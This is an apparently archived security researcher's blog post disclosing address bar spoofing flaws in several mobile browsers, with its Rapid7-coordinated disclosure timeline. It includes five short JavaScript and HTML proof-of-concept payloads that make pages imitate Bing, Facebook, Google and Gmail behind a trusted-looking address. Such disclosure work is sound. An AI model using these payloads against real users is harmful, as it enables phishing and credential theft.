---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2020-10-20_multiple-address-bar-spoofing-vulnerabilities-in-mobile-browsers.md
original_filename: 2020-10-20_multiple-address-bar-spoofing-vulnerabilities-in-mobile-browsers.md
title: Multiple Address Bar Spoofing Vulnerabilities In Mobile Browsers
category: documents
detected_topics:
- xss
- mobile-security
- command-injection
- otp
- automation-abuse
- cloud-security
tags:
- imported
- documents
- xss
- mobile-security
- command-injection
- otp
- automation-abuse
- cloud-security
language: en
raw_sha256: 53c5ffee027d86dda8f49dfb4bed4f5a3822997a205aa82cf53565710b322578
text_sha256: 036780a6f8e2fd031c5f3560609763260e40f73a642c574841ab594db3233049
ingested_at: '2026-06-28T07:32:03Z'
sensitivity: unknown
redactions_applied: false
---

# Multiple Address Bar Spoofing Vulnerabilities In Mobile Browsers

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2020-10-20_multiple-address-bar-spoofing-vulnerabilities-in-mobile-browsers.md
- Source Type: markdown
- Detected Topics: xss, mobile-security, command-injection, otp, automation-abuse, cloud-security
- Ingested At: 2026-06-28T07:32:03Z
- Redactions Applied: False
- Raw SHA256: `53c5ffee027d86dda8f49dfb4bed4f5a3822997a205aa82cf53565710b322578`
- Text SHA256: `036780a6f8e2fd031c5f3560609763260e40f73a642c574841ab594db3233049`


## Content

---
title: "Multiple Address Bar Spoofing Vulnerabilities In Mobile Browsers"
page_title: "Multiple Address Bar Spoofing Vulnerabilities In Mobile Browsers - Miscellaneous Ramblings of a Cyber Security Researcher"
url: "https://www.rafaybaloch.com/2020/10/multiple-address-bar-spoofing-vulnerabilities.html"
final_url: "https://www.rafaybaloch.com/2020/10/multiple-address-bar-spoofing-vulnerabilities.html"
authors: ["Rafay Baloch (@rafaybaloch)"]
programs: ["Yandex", "Apple", "Opera"]
bugs: ["Address Bar Spoofing"]
publication_date: "2020-10-20"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 4191
---

##  Background

Google on their [Google Vulnerability Reward Program (VRP) rules ](https://www.google.co.uk/about/appsecurity/reward-program/)classifies address bar as the only reliable security indicator in order to validate the authenticity of the website. To quote them, “We recognize that the address bar is the only reliable security indicator in modern browsers”. Since the inception of Covid-19, a remarkable increase in spear phishing attacks has been recorded.

  
As per a report by [Zscaler](https://www.infosecurity-magazine.com/news/experts-detect-30000-increase/) in April 2020, a significant increase of about 85% increase in phishing attacks were recorded in April, aimed at targeting remote workers in which attackers had registered domains featuring Covid-19 related keywords such as “wuhan”, “vaccine” etc. in order to steal credentials, disseminate malware, most notably ransomware for conducting financial frauds. More recently, Microsoft in its [Microsoft Digital Defense Report](https://www.microsoft.com/en-us/download/details.aspx?id=101738), has highlighted about the increasing sophistication of cyber threats and has categorized email phishing as the most dominant attack vector for enterprises.

  
With ever growing sophistication of spear phishing attacks, exploitation of browser-based vulnerabilities such as address bar spoofing may exacerbate the success of spear phishing attacks and hence prove to be very lethal. First and foremost, it is easy to persuade the victim into stealing credentials or distributing malware when the address bar points to a trusted website and giving no indicators forgery, secondly since the vulnerability exploits a specific feature in a browser, it can evade several anti-phishing schemes and solutions.

  
In the past, I have uncovered several address bar spoofing vulnerabilities in Desktop & Mobile browsers, writeups of which can be found here, here and here. Apart from which, I presented a paper at Blackhat “[Bypassing Browser Security Policies for Fun and Profit ](https://www.rafaybaloch.com/2017/06/bypassing-browser-security-policies-for.html)“ which discussed various types of spoofing related issues.

  
More recently, as a part of my thesis while perusing MSC in Cyber Security, I had written a framework for testing various categories of browser vulnerabilities such as UXSS, file cross attacks, CSP bypasses and spoofing attacks. The results uncovered several security address bar spoofing vulnerabilities in mobile browsers.

  

Note: Before diving into the technical details, I would like to mention here that the vulnerability disclosure was handled by Tod Bearsley of Rapid7, you can read about their disclosure. 

## Technical Details

The following section will discuss about vulnerabilities found in browsers along with their POC. It is imperative to mention here that similar issues have been found in several other browsers, however they will be published once the coordinated disclosure timeline has been elapsed. 

  

The following is a proof of concept (POC) demonstrating a browser based spoofing vulnerability 

Safari for both iOS and Mac. The vulnerability occurs due to Safari preserving address bar of the URL when requested over an arbitrary port, the set interval function reloads bing.com:8080 every 2 milliseconds and hence user is unable to recognize the redirection from the original URL to spoofed URL. What makes this vulnerability more effective in Safari by default does not reveal port number in URL unless and until focus is set via cursor. 

  

##  Address Bar Spoofing – Vulnerability 1 

### Proof of Concept

<script>

document.write("<h1>This is not Bing</h1>"); 

location.href = "https://bing.com:8081"; 

setInterval(function(){location.href="https://bing.com:8080"},2000); 

</script>

  

Note: The value of setInterval function maybe adjusted according to the browser in order to achieve an effective URL spoof. 

  
  

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEj84vLFo3KfD1VxMMEakdht4vOG7xCX3OkIav2x0nFa_z8Y5r4JTI70KjoKadY0beGGslIpzNPFrScqnP0H5joLNgIVeS1K79TWhBgmogDF5ZuYvfDAAHi_bReacGdPpmVswiemtmlhhfo/w640-h192/1.tif)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEj84vLFo3KfD1VxMMEakdht4vOG7xCX3OkIav2x0nFa_z8Y5r4JTI70KjoKadY0beGGslIpzNPFrScqnP0H5joLNgIVeS1K79TWhBgmogDF5ZuYvfDAAHi_bReacGdPpmVswiemtmlhhfo/s1788/1.tif)  
  
  
---  
Figure 1: Address Bar spoofing in MAC OS HIGH SIERRA 10.13.6 (17G14019)  
  
  
  
  
  
  

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh6rWLlKBF9uXP26CMEmXhiH2Y22Und2-Tcx-7qtoSibCNb2CoafJ5feTYpJYnEN4ctsf8ZD17CNZd6xi-4RL6a1lshT-_KvPE9R-Cpekmzah52ErEj80J1g0ZWQTw6k1zIYIfU0NRxBm4/w314-h640/2.tif)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh6rWLlKBF9uXP26CMEmXhiH2Y22Und2-Tcx-7qtoSibCNb2CoafJ5feTYpJYnEN4ctsf8ZD17CNZd6xi-4RL6a1lshT-_KvPE9R-Cpekmzah52ErEj80J1g0ZWQTw6k1zIYIfU0NRxBm4/s1788/2.tif)  
---  
Figure 2: Address Bar spoofing in Safari Version 13.1.2 (13609.3.5.1.5) on 13.6.1  
  

  

  

  

##  Address Bar Spoofing – Vulnerability 2 

### Proof of Concept

The following is a proof of concept (POC) demonstrating a browser based spoofing vulnerability 

in yandex browser for android and opera touch for iOS:

  

<p class="test"><input class="btn btn-success btn-lg" type="button" value="Run test case" 

onclick="win = window.open(&quot;https://www.facebook.com:8080&quot;,&quot;WIN&quot;); 

window.open(&quot;https://www.bing.com&quot;, &quot;WIN&quot;); 

win.window.stop();

win.document.write('This is not Facebook'); 

win.document.close();

" /></p>

  

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh0bSeBQTya2MBS7vz0QTGDpcWbj7cqF69vthuTr_o_xJl74xToDfc-CZ_yBIgvOOfS7FdEW9FakQWmryKOBLrxlWpRYoWlNkQkagHtPuhtuNarA8kDakuPPcER7KTvWl-SmHmUvJlaYpo/w504-h640/3.tif)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh0bSeBQTya2MBS7vz0QTGDpcWbj7cqF69vthuTr_o_xJl74xToDfc-CZ_yBIgvOOfS7FdEW9FakQWmryKOBLrxlWpRYoWlNkQkagHtPuhtuNarA8kDakuPPcER7KTvWl-SmHmUvJlaYpo/s882/3.tif)  
---  
Figure 3: Address Bar spoofing vulnerability in Yandex browser for android  
  
  
[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjx0hUPtltzvWX8Nq-l_njCWuc-a40GZP1suLzG2wFUwH9rclt3CP-1NiD3e35haEgsPCXzyXznAgdf83EMPJ6cmFd_fTlplvkQ-_H1Eh-Q0T9BtBCI7JMQ6u5R7H_x-dwkBgROtwVjC0g/w458-h640/4.tif)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjx0hUPtltzvWX8Nq-l_njCWuc-a40GZP1suLzG2wFUwH9rclt3CP-1NiD3e35haEgsPCXzyXznAgdf83EMPJ6cmFd_fTlplvkQ-_H1Eh-Q0T9BtBCI7JMQ6u5R7H_x-dwkBgROtwVjC0g/s940/4.tif)  
---  
Figure 4: Address Bar spoofing vulnerability in opera touch for iOS  
  
  

##  Address Bar Spoofing – Vulnerability 3 

### Proof of Concept

The following is a proof of concept (POC) demonstrating a browser based spoofing vulnerability 

in UC Browser for android and opera touch iOS:

  

<script>

function spoof() {

document.write("<h1>This is not Bing</h1>"); 

document.location = "https://bing.com:1234"; 

setInterval(function(){document.location="https://bing.com:1234";},9800); 

};

</script>

<p class="test"><input class="btn btn-success btn-lg" type="button" value="Run test case" onclick="spoof();" />

</p>

  

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg4BvOYvAO4RfXpSxRnYrCT5OIw3HR7DO4BVK7aGiqkxXMF0SkfcxjRlU6x1HNkHZH-qmdv8KX0yFnFwwxT0Cb0Yt3dYdXsR9NhK33Tqm25DO6nMZojZ-BgF2kJVLVldOujn_N6gA_Xor0/w580-h640/5.tif)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg4BvOYvAO4RfXpSxRnYrCT5OIw3HR7DO4BVK7aGiqkxXMF0SkfcxjRlU6x1HNkHZH-qmdv8KX0yFnFwwxT0Cb0Yt3dYdXsR9NhK33Tqm25DO6nMZojZ-BgF2kJVLVldOujn_N6gA_Xor0/s682/5.tif)  
---  
Figure 5: Address Bar spoofing vulnerability in UC browser for android  
  
  

  

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjd9ggdnWj_EUiBAHC35LAbD-L8UF8g80CykvDUnGhhoWsXF5-7PuHVfIvodTkHQSc1fJMVP-dstsvv5kX_0-a2nmbgPerd1Z6pPHh0dqzOwiMIEK8pa_RmPOYX9bfjNDyzJk8h-exmr-s/w516-h640/6.tif)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjd9ggdnWj_EUiBAHC35LAbD-L8UF8g80CykvDUnGhhoWsXF5-7PuHVfIvodTkHQSc1fJMVP-dstsvv5kX_0-a2nmbgPerd1Z6pPHh0dqzOwiMIEK8pa_RmPOYX9bfjNDyzJk8h-exmr-s/s836/6.tif)  
---  
Figure 6: Address Bar spoofing vulnerability in Opera Touch for iOS  
  
  

##  Address Bar Spoofing – Vulnerability 4 

### Proof of Concept

The following is a proof of concept (POC) demonstrating a browser based spoofing vulnerability in Opera browser for iOS. Apparently, data scheme followed by arbitrary URL leads to preservation of the URL and hence triggers address bar spoofing condition. 

  

<h2>Spoof 13</h2>

<script>

function pocccc(){

var w=open('data://google.com');

w.document.body.innerHTML='This is not google';

}

</script>

<p class="test"><input class="btn btn-success btn-lg" type="button" value="Run test case" 

onclick="pocccc();" />

</p>

  

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhkGSWuhgmX9L63TIFnvtSp4da3Sj1bbxhTpj14YrVzqBTUBdbCTfV9ZzgVfd7LMCnN9q1tR1lfVX90cxrU797-1QF3JjrnOU4_SqZUGaVq0MmQsSYd5AJNETKLpOPp8AeTWT5RC0qDYi0/w456-h640/7.tif)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhkGSWuhgmX9L63TIFnvtSp4da3Sj1bbxhTpj14YrVzqBTUBdbCTfV9ZzgVfd7LMCnN9q1tR1lfVX90cxrU797-1QF3JjrnOU4_SqZUGaVq0MmQsSYd5AJNETKLpOPp8AeTWT5RC0qDYi0/s628/7.tif)  
---  
Figure 7: Address Bar spoofing vulnerability in Opera touch Browser  
  
  
  

##  Address Bar Spoofing – Vulnerability 5 

### Proof of Concept

The following is a proof of concept (POC) demonstrating a browser based spoofing vulnerability 

in UC browser for Android, Opera browser for Android, RITS browser for Android, Bolt Browser for IOS: 

  

<script>

function spoof()

{

var gmail = 'PCFET0NC8+KArOK........ZHk+PC9odG1sPg=='; //The base64 encoded version of the Gmail page 

x=document.body.innerHTML=atob(gmail);

document.write("<title>Gmail</title>");

document.write("x");

window.location.assign("https://www.Gmail.com:8080");

}

setInterval(spoof(),100000);

</script>

  

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhaALRlZEmQZhOFsY3KBsxohIPfKM7bq9mwmhRjJh1EtuBu6gSgqxPfpdz0BR_WZrpVxKNd1WLPNLFeXrDmJLG_wFUxdcC8NRbELYz-MbjXOOApnQspIkJGHu4-D3R6SKFxtTyxxzGaPK8/w476-h640/8.tif)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhaALRlZEmQZhOFsY3KBsxohIPfKM7bq9mwmhRjJh1EtuBu6gSgqxPfpdz0BR_WZrpVxKNd1WLPNLFeXrDmJLG_wFUxdcC8NRbELYz-MbjXOOApnQspIkJGHu4-D3R6SKFxtTyxxzGaPK8/s698/8.tif)  
---  
Figure 8: Address Bar spoofing vulnerability in UC Browser Android  
  
  

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjc0kx4kHfjPbvDrpmLVV3Yn6lUvumbbghGo6L3wnGEQj2I-tNVT8nacI-brb-Zf_ydAMKuipGmDheKbxcCTWZw4mI1IqWNEhRn4PvjU3jMMuSal6ld_8YYUyyD4OvkIILPrmfBdHiP7uo/w494-h640/9.tif)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjc0kx4kHfjPbvDrpmLVV3Yn6lUvumbbghGo6L3wnGEQj2I-tNVT8nacI-brb-Zf_ydAMKuipGmDheKbxcCTWZw4mI1IqWNEhRn4PvjU3jMMuSal6ld_8YYUyyD4OvkIILPrmfBdHiP7uo/s776/9.tif)  
---  
Figure 9: Address Bar spoofing vulnerability in Opera Mini Android  
  

  

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgZ0UgcpMSufFASvJ6wLskHY-fOITz64Al3JtQNEE_Jb924nwwzo46pMh2e4MB_rrUeiAlWtOAPvMuv-BGY74sMN_CnIuh4Y_TtfafHb6YDQvu-teCY4TxsGuZ_6Wa-bO2ELXCvE-rXLjk/w456-h640/10.tif)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgZ0UgcpMSufFASvJ6wLskHY-fOITz64Al3JtQNEE_Jb924nwwzo46pMh2e4MB_rrUeiAlWtOAPvMuv-BGY74sMN_CnIuh4Y_TtfafHb6YDQvu-teCY4TxsGuZ_6Wa-bO2ELXCvE-rXLjk/s678/10.tif)  
---  
Figure 10: Address Bar spoofing vulnerability in RITS Browser  
  

  

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgoxLdgEAIuT1QMmwHIOWnec_9GJ1rk8Vv5HOh-q-MuLfwwow1Xacx4yBES4gCGIRBrbsyoTPyFQkxu8WYsuOqeMRv3kH6ssTyIvtyxh5zkC9d2gV5QVt9q1fiJzARkeL3aHPlE41pC-iQ/w508-h640/11.tif)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgoxLdgEAIuT1QMmwHIOWnec_9GJ1rk8Vv5HOh-q-MuLfwwow1Xacx4yBES4gCGIRBrbsyoTPyFQkxu8WYsuOqeMRv3kH6ssTyIvtyxh5zkC9d2gV5QVt9q1fiJzARkeL3aHPlE41pC-iQ/s926/11.tif)  
---  
Figure 11: Address bar spoofing vulnerability in Bolt BROWSER IOS  
  
  

##  Vulnerability Disclosure and Coordination 

The vulnerability disclosure was handled by Tod Beardsley of Rapid7 who is the go-to guy for any coordinated disclosures. As per industry’s standard practice, a timeframe of 60 days was assigned to all entities for issuing a patch. While Apple and Opera responded immediately to the initial disclosure, Yandex and RITS responded shortly before publication. RITS and Opera have committed to fixes in their next release, while Yandex and Safari have already issued updates as of this writing

  

It’s is pertinent to mention here that several mobile browsers with huge user-base do not even have a dedicated email for reporting security vulnerabilities, which discourages security researchers from reporting security vulnerabilities. Google Chrome and Firefox have a bug bounty program in which both Desktop and mobile browsers are in-scope, where as Microsoft’s bug bounty program is only limited to Desktop version. Apart from which there is a small subset of mobile browsers incentivizing security researchers and bug bounty hunters for reporting vulnerabilities. 

  

##  Acknowledgements

I am highly indebted to Tod Beardsley for assisting with responsible disclosures since 2016. I am also thankful to Dr. Muhammad Yousaf Head of Computer Sciences at Riphah University for supervising my thesis which resulted in uncovering novel security issues.
